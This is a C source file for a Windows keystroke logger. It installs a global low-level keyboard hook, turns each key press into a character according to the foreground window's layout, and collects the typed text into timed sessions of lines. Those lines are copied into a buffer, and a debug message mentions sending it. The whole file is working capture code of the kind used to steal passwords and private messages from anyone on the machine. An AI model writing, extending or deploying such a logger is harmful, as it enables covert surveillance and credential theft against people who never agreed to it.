#include "hook.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <windows.h>


static HHOOK keyboardHook = NULL;
static KeySession* sessions = NULL;
static int sessions_count = 0;
static int sessions_capacity = 0;

static char vk_char_buf[8];

static DWORD last_key_time = 0;

static char* current_line = NULL;
static size_t current_line_len = 0;
static size_t current_line_cap = 64;

static void start_new_session() {
    if (sessions_count >= sessions_capacity) {
        sessions_capacity = (sessions_capacity == 0) ? 4 : sessions_capacity * 2;
        KeySession* new_sessions = realloc(sessions, sessions_capacity * sizeof(KeySession));
        if (!new_sessions) {
            fprintf(stderr, "Failed to realloc sessions\n");
            return;
        }
        sessions = new_sessions;
    }

    KeySession* sess = &sessions[sessions_count];
    sess->lines = malloc(INITIAL_LINE_CAPACITY * sizeof(char*));

    if (!sess->lines) {
        fprintf(stderr, "Failed to malloc session lines\n");
        return;
    }
    sess->line_count = 0;
    sess->capacity = INITIAL_LINE_CAPACITY;

    sessions_count++;
}

static void add_line_to_session(KeySession* sess, const char* line) {
    if (sess->line_count >= sess->capacity) {
        sess->capacity *= 2;
        char** new_lines = realloc(sess->lines, sess->capacity * sizeof(char*));
        if (!new_lines) {
            fprintf(stderr, "Failed to realloc session lines\n");
            return;
        }
        sess->lines = new_lines;
    }
    sess->lines[sess->line_count] = _strdup(line);
    sess->line_count++;
}

static void append_char_to_line(char ch) {
    if (!current_line) {
        current_line = malloc(current_line_cap);
        if (!current_line) {
            fprintf(stderr, "Failed to malloc current_line\n");
            return;
        }
        current_line_len = 0;
    }
    if (current_line_len + 1 >= current_line_cap) {
        current_line_cap *= 2;
        char* new_line = realloc(current_line, current_line_cap);
        if (!new_line) {
            fprintf(stderr, "Failed to realloc current_line\n");
            free(current_line);
            current_line = NULL;
            current_line_len = 0;
            current_line_cap = 64;
            return;
        }
        current_line = new_line;
    }
    current_line[current_line_len++] = ch;
    current_line[current_line_len] = '\0';
}

void flush_current_line() {
    if (current_line && current_line_len > 0) {
        if (sessions_count == 0) {
            start_new_session();
        }
        add_line_to_session(&sessions[sessions_count - 1], current_line);
        free(current_line);
        current_line = NULL;
        current_line_len = 0;
        current_line_cap = 64;
    }
}

static const char* vk_to_char(DWORD vkCode, KBDLLHOOKSTRUCT* hookStruct) {
    BYTE keyboardState[256];
    if (!GetKeyboardState(keyboardState)) {
        printf("GetKeyboardState failed\n");
        return NULL;
    }

    HWND hwnd = GetForegroundWindow();
    DWORD threadId = GetWindowThreadProcessId(hwnd, NULL);
    HKL layout = GetKeyboardLayout(threadId);

    WCHAR buf[8] = { 0 };

    UINT scanCode = hookStruct->scanCode;
    if (hookStruct->flags & LLKHF_EXTENDED) {
        scanCode |= 0xE000;
    }

    int ret = ToUnicodeEx(vkCode, scanCode, keyboardState, buf, _countof(buf) - 1, 0, layout);

    if (ret == -1) {
        BYTE dummyState[256] = { 0 };
        ToUnicodeEx(VK_RETURN, 0, dummyState, buf, _countof(buf) - 1, 0, layout);
        return NULL;
    }

    if (ret > 0) {
        int len = WideCharToMultiByte(CP_UTF8, 0, buf, ret, vk_char_buf, sizeof(vk_char_buf) - 1, NULL, NULL);
        if (len > 0) {
            vk_char_buf[len] = '\0';
            return vk_char_buf;
        }
    }
    return NULL;
}

static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            fflush(stdout);

            DWORD now = GetTickCount();

            if (now - last_key_time > SESSION_PAUSE_MS) {
                flush_current_line();
                start_new_session();
            }
            last_key_time = now;

            const char* ch = vk_to_char(p->vkCode, p);
            if (ch && ch[0]) {
                printf(ch);
                fflush(stdout);

                if (p->vkCode == VK_RETURN) {
                    flush_current_line();
                }
                else if (p->vkCode == VK_BACK) {
                    if (current_line_len > 0) {
                        current_line_len--;
                        current_line[current_line_len] = '\0';
                    }
                }
                else {
                    append_char_to_line(ch[0]);
                }
            }
            else {
                printf("Buffer is empty, nothing to send\n");
                fflush(stdout);
            }
        }
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

bool install_keyboard_hook(void) {
    if (keyboardHook == NULL) {
        keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
        if (!keyboardHook) {
            fprintf(stderr, "Failed to install hook\n");
            return false;
        }
        return true;
    }
    return false;
}

void uninstall_keyboard_hook(void) {
    if (keyboardHook) {
        UnhookWindowsHookEx(keyboardHook);
        keyboardHook = NULL;
    }
    for (int i = 0; i < sessions_count; i++) {
        for (int j = 0; j < sessions[i].line_count; j++) {
            free(sessions[i].lines[j]);
        }
        free(sessions[i].lines);
    }
    free(sessions);
    sessions = NULL;
    sessions_count = 0;

    if (current_line) {
        free(current_line);
        current_line = NULL;
    }
}

void process_sessions(void) {
    printf("=== Key sessions: ===\n");
    for (int i = 0; i < sessions_count; i++) {
        printf("Session %d:\n", i + 1);
        for (int j = 0; j < sessions[i].line_count; j++) {
            printf("  %s\n", sessions[i].lines[j]);
        }
    }
}

void sessions_to_buffer(void) {
    buffer_cleanup();
    buffer_init();

    for (int i = 0; i < sessions_count; i++) {
        KeySession* sess = &sessions[i];
        for (int j = 0; j < sess->line_count; j++) {
            buffer_add_key(sess->lines[j]);
            buffer_add_key("\n");
        }
    }
}
